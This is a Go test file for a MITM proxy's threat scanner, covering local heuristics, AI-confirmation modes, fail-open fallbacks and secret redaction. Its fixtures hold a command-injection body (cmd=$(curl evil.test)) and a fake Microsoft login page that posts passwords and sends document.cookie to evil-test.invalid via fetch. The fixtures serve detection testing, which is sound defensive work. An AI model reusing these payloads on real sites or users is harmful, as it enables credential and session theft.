package threats

import (
	"context"
	"errors"
	"strings"
	"testing"

	cfgpkg "mitm-proxy/internal/config"
)

func TestScannerBlocksHighRiskLocalHeuristics(t *testing.T) {
	cfg := &cfgpkg.Config{}
	cfg.ThreatScanner.Enabled = true
	cfg.ThreatScanner.Mode = "suspicious_only"
	cfg.ThreatScanner.Provider = "none"
	cfg.ThreatScanner.ScanRequests = true
	cfg.ThreatScanner.ScanResponses = true
	cfg.ThreatScanner.BlockThreshold = 0.85
	cfg.ThreatScanner.WarnThreshold = 0.65
	cfg.ThreatScanner.RequireAIConfirm = false

	manager := NewManager(func() *cfgpkg.Config { return cfg })
	verdict, err := manager.ScanRequest(context.Background(), ScanInput{
		Method:     "POST",
		URL:        "http://10.0.0.5/login?next=verify",
		Host:       "10.0.0.5",
		BodySample: []byte(`username=alice&password=secret&cmd=$(curl evil.test)`),
	})
	if err != nil {
		t.Fatalf("ScanRequest returned error: %v", err)
	}
	if verdict.Action != ActionBlock {
		t.Fatalf("expected block verdict, got %#v", verdict)
	}
}

func TestScannerRequiresAIConfirmationBeforeBlocking(t *testing.T) {
	cfg := &cfgpkg.Config{}
	cfg.ThreatScanner.Enabled = true
	cfg.ThreatScanner.Mode = "suspicious_only"
	cfg.ThreatScanner.Provider = "none"
	cfg.ThreatScanner.ScanRequests = true
	cfg.ThreatScanner.ScanResponses = true
	cfg.ThreatScanner.BlockThreshold = 0.85
	cfg.ThreatScanner.WarnThreshold = 0.65
	cfg.ThreatScanner.RequireAIConfirm = true
	cfg.ThreatScanner.FailOpen = true

	manager := NewManager(func() *cfgpkg.Config { return cfg })
	verdict, err := manager.ScanResponse(context.Background(), ScanInput{
		Method: "GET",
		URL:    "http://localhost:8000/",
		Host:   "localhost:8000",
		BodySample: []byte(`<!doctype html><h1>Microsoft Account Login</h1>
			<form action="https://evil-test.invalid/steal" method="post">
			<input name="email"><input name="password" type="password"></form>
			<script>fetch("https://evil-test.invalid/exfiltrate", { method: "POST", body: document.cookie });</script>`),
	})
	if err != nil {
		t.Fatalf("ScanResponse returned error: %v", err)
	}
	if verdict.Action != ActionWarn {
		t.Fatalf("expected warn verdict pending AI confirmation, got %#v", verdict)
	}
}

func TestScannerBlocksWhenAIConfirms(t *testing.T) {
	cfg := aiConfirmationConfig()
	manager := NewManager(func() *cfgpkg.Config { return cfg })
	manager.ai = fakeAIClient{verdict: ThreatVerdict{
		Threat:     true,
		Confidence: 0.97,
		Category:   "phishing",
		Reason:     "Fake Microsoft login form exfiltrates credentials.",
		Action:     ActionBlock,
		Signals:    []string{"ai-confirmed"},
	}}

	verdict, err := manager.ScanResponse(context.Background(), phishingResponseInput())
	if err != nil {
		t.Fatalf("ScanResponse returned error: %v", err)
	}
	if verdict.Action != ActionBlock {
		t.Fatalf("expected AI-confirmed block, got %#v", verdict)
	}
}

func TestScannerDoesNotBlockWhenAIDisagrees(t *testing.T) {
	cfg := aiConfirmationConfig()
	manager := NewManager(func() *cfgpkg.Config { return cfg })
	manager.ai = fakeAIClient{verdict: ThreatVerdict{
		Threat:     false,
		Confidence: 0.82,
		Category:   "benign_test_page",
		Reason:     "The content is a controlled benign test fixture.",
		Action:     ActionAllow,
		Signals:    []string{"ai-reviewed"},
	}}

	verdict, err := manager.ScanResponse(context.Background(), phishingResponseInput())
	if err != nil {
		t.Fatalf("ScanResponse returned error: %v", err)
	}
	if verdict.Action == ActionBlock || verdict.Action == ActionQuarantine {
		t.Fatalf("expected AI disagreement to avoid blocking, got %#v", verdict)
	}
}

func TestScannerWarnsWhenAIUnavailableInConfirmationMode(t *testing.T) {
	cfg := aiConfirmationConfig()
	cfg.ThreatScanner.BlockCriticalOnAIFailure = false
	manager := NewManager(func() *cfgpkg.Config { return cfg })
	manager.ai = fakeAIClient{err: errors.New("network unavailable")}

	verdict, err := manager.ScanResponse(context.Background(), phishingResponseInput())
	if err == nil {
		t.Fatalf("expected AI error")
	}
	if verdict.Action != ActionWarn {
		t.Fatalf("expected warn when AI confirmation is unavailable, got %#v", verdict)
	}
}

func TestScannerBlocksCriticalLocalEvidenceWhenAIUnavailable(t *testing.T) {
	cfg := aiConfirmationConfig()
	cfg.ThreatScanner.BlockCriticalOnAIFailure = true
	manager := NewManager(func() *cfgpkg.Config { return cfg })
	manager.ai = fakeAIClient{err: errors.New("network unavailable")}

	verdict, err := manager.ScanResponse(context.Background(), phishingResponseInput())
	if err == nil {
		t.Fatalf("expected AI error")
	}
	if verdict.Action != ActionBlock {
		t.Fatalf("expected critical local AI failure block, got %#v", verdict)
	}
	if !strings.Contains(strings.Join(verdict.Signals, ","), "critical-local-ai-failure-block") {
		t.Fatalf("expected critical fallback signal, got %#v", verdict.Signals)
	}
}

func TestScannerDisabledAllows(t *testing.T) {
	cfg := &cfgpkg.Config{}
	cfg.ThreatScanner.Enabled = false
	cfg.ThreatScanner.ScanRequests = true

	manager := NewManager(func() *cfgpkg.Config { return cfg })
	verdict, err := manager.ScanRequest(context.Background(), ScanInput{
		Method:     "GET",
		URL:        "http://example.test/",
		Host:       "example.test",
		BodySample: []byte(`password=secret`),
	})
	if err != nil {
		t.Fatalf("ScanRequest returned error: %v", err)
	}
	if verdict.Action != ActionAllow {
		t.Fatalf("expected allow verdict, got %#v", verdict)
	}
}

func TestRedactionRemovesCommonSecrets(t *testing.T) {
	body := []byte(`{"email":"dev@example.com","token":"eyJabc.def.ghi","password":"supersecret123","card":"4111 1111 1111 1111"}`)
	redacted := string(RedactBody(body))
	for _, secret := range []string{"dev@example.com", "eyJabc.def.ghi", "supersecret123", "4111 1111 1111 1111"} {
		if strings.Contains(redacted, secret) {
			t.Fatalf("redacted body still contains %q: %s", secret, redacted)
		}
	}
}

func aiConfirmationConfig() *cfgpkg.Config {
	cfg := &cfgpkg.Config{}
	cfg.ThreatScanner.Enabled = true
	cfg.ThreatScanner.Mode = "suspicious_only"
	cfg.ThreatScanner.Provider = "openai"
	cfg.ThreatScanner.ScanResponses = true
	cfg.ThreatScanner.BlockThreshold = 0.85
	cfg.ThreatScanner.WarnThreshold = 0.65
	cfg.ThreatScanner.RequireAIConfirm = true
	cfg.ThreatScanner.FailOpen = true
	cfg.ThreatScanner.BlockCriticalOnAIFailure = false
	return cfg
}

func phishingResponseInput() ScanInput {
	return ScanInput{
		Method: "GET",
		URL:    "http://localhost:8000/",
		Host:   "localhost:8000",
		BodySample: []byte(`<!doctype html><h1>Microsoft Account Login</h1>
			<form action="https://evil-test.invalid/steal" method="post">
			<input name="email"><input name="password" type="password"></form>
			<script>fetch("https://evil-test.invalid/exfiltrate", { method: "POST", body: document.cookie });</script>`),
	}
}

type fakeAIClient struct {
	verdict ThreatVerdict
	err     error
}

func (f fakeAIClient) Classify(ctx context.Context, cfg cfgpkg.ThreatScannerConfig, input ScanInput, evidence EvidenceBundle) (ThreatVerdict, string, error) {
	return f.verdict, cfg.Model, f.err
}
